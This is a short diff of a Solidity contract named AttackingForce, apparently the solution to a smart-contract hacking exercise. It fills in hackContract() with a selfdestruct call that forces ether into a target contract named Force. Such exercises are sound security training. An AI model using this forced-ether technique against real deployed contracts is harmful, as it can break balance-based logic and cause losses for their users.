@@ -2,6 +2,8 @@
 pragma solidity ^0.8.9;
 import "./Force.sol";
 
+import "hardhat/console.sol";
+
 contract AttackingForce {
     address public contractAddress;
 
@@ -10,6 +12,7 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        address payable addr = payable(address(contractAddress));
+        selfdestruct(addr);
     }
 }
